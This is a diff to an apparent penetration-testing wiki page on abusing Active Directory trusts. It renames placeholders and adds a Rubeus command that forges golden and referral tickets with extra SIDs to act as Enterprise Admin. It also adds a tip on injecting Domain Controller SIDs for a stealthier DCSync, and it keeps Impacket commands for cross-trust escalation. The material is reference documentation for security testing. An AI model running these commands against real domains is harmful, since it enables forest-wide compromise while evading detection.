@@ -1,5 +1,5 @@
 ---
-authors: ShutdownRepo
+authors: ShutdownRepo, WodenSec
 ---
 
 # Trusts
@@ -429,31 +429,45 @@ If SID filtering is partially enabled, set the RID >=1000.
 ##### Referral ticket
 ```bash
 # 1. forge the ticket
-ticketer.py -nthash "inter-realm key" -domain-sid "child_domain_SID" -domain "child_domain_FQDN" -extra-sid "<root_domain_SID>-<RID>" -spn "krbtgt/root_domain_fqdn" "someusername"
+ticketer.py -nthash "inter-realm key" -domain-sid "compromised_domain_SID" -domain "compromised_domain_FQDN" -extra-sid "<target_domain_SID>-<RID>" -spn "krbtgt/target_domain_fqdn" "someusername"
 
 # 2. use it to request a service ticket
-KRB5CCNAME="someusername.ccache" getST.py -k -no-pass -debug -spn "CIFS/domain_controller" "root_domain_fqdn/someusername@root_domain_fqdn"
+KRB5CCNAME="someusername.ccache" getST.py -k -no-pass -debug -spn "CIFS/domain_controller" "target_domain_fqdn/someusername@target_domain_fqdn"
 ```
 
 
 ```bash
-ticketer.py -nthash "child_domain_krbtgt_NT_hash" -domain-sid "child_domain_SID" -domain "child_domain_FQDN" -extra-sid "-" "someusername"
+ticketer.py -nthash "compromised_domain_krbtgt_NT_hash" -domain-sid "compromised_domain_SID" -domain "compromised_domain_FQDN" -extra-sid "-" "someusername"
 ```
 
 
 Impacket's [raiseChild.py](https://github.com/fortra/impacket/blob/master/examples/raiseChild.py) script can also be used to conduct the golden ticket technique automatically when SID filtering is disabled (retrieving the SIDs, dumping the trusted domain's krbtgt, forging the ticket, dumping the forest root keys, etc.). It will forge a ticket with the Enterprise Admins extra SID.
 
 ```bash
-raiseChild.py "child_domain"/"child_domain_admin":"$PASSWORD"
+raiseChild.py "compromised_domain"/"compromised_domain_admin":"$PASSWORD"
 ```
 
 
-=== 🛠️ Windows
+=== Windows
 
-// TODO
+From Windows machines, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used for that purpose.
+
+If SID filtering is disabled, set the RID to 519 to act as Enterprise Admin.
+
+If SID filtering is partially enabled, set the RID >=1000.
+
+##### Referral ticket
+```powershell
+# Generate the ticket and use Pass-the-Ticket
+Rubeus.exe golden /user:Administrator /id:500 /domain:<compromised_domain_FQDN> /sid:<compromised_domain_SID> /groups:513 /sids:<target_domain_SID>-<RID> /aes256:<compromised_domain_krbtgt_aes256_key> /ptt
+```
 
 :::
 
+> [!TIP]
+> If the goal is to perform a DCSync attack on the target domain - and if SID filtering is disabled - a stealthier approach consists in injecting the "Domain Controllers" (516) and "Enterprise Domain Controllers" (S-1-5-9) RID in the SID history. This can help avoid suspicious logs and detection.
+
+:::
 
 ### 🛠️ SID filtering bypass
 
@@ -506,11 +520,11 @@ python3 .\frida_intercept.py lsass.exe
 ##### 3. Get local admin on the target
 ```bash
 # 1. Forge an inter-realm/referral ticket with the spoofed SID put as extended SID with RID 500 using the AES key of the incoming trust
-ticketer.py -aesKey "AES_key_of_incoming_trust" -domain "trusted_root_domain_FQDN" -domain-sid "trusted_root_domain_SID" -user-id 1000 -groups 513 -extra-sid "<spoofed_SID>"-500 -spn "krbtgt/trusting_root_domain_FQDN" "someusername"
+ticketer.py -aesKey "AES_key_of_incoming_trust" -domain "trusted_target_domain_FQDN" -domain-sid "trusted_target_domain_SID" -user-id 1000 -groups 513 -extra-sid "<spoofed_SID>"-500 -spn "krbtgt/trusting_target_domain_FQDN" "someusername"
 
 # 2. Request a service ticket using the forged referral ticket
 # Notice that keys has to be manually modified in the getftST.py script before
-KRB5CCNAME="someusername.ccache" getftST.py -spn "CIFS/target_server_FQDN" -target-domain "trusting_root_domain_FQDN" -via-domain "trusted_root_domain_FQDN" "domain/username" -dc-ip "target_DC_IP"
+KRB5CCNAME="someusername.ccache" getftST.py -spn "CIFS/target_server_FQDN" -target-domain "trusting_target_domain_FQDN" -via-domain "trusted_target_domain_FQDN" "domain/username" -dc-ip "target_DC_IP"
 
 # 3. Use the obtained ST to access the target server as local admin
 KRB5CCNAME=username.ccache smbclient.py -k "trusted_domain"/"someusername"@"target_server_FQDN" -no-pass
